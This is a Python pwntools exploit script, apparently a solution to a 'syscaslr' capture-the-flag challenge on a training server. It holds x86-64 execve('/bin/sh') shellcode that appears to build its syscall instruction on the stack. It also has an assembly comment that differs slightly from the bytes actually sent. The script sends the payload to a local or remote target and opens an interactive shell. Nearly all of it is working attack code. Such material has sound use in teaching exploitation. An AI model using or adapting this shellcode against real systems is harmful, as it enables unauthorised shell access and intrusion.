# coding=UTF-8
from pwn import *

'''
pop r8
pop r8
pop r8
add r8, 0x36
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rbx, rbx
push rbx
mov rsi, rsp
mov rdx, rsp
mov rax, 0x3b
mov rcx, 0x0400
add rcx, 0x0100
add rcx, 0x0e
add rcx, 0x01
push rcx
jmp rsp
'''

ELF('./syscaslr')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 3102)
else:
    r = process('./syscaslr')
    gdb.attach(r, '''
        #b *get_shellcode+31
        #c
    ''')

shellcode =b"\x41\x58\x41\x58\x41\x58\x49\x83\xC0\x36\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC1\xF0\x04\x00\x00\x48\x83\xC1\x1F\x4C\x89\xC4\x51\xFF\xE4"


input('press a key...')
r.sendline(shellcode)
r.interactive()

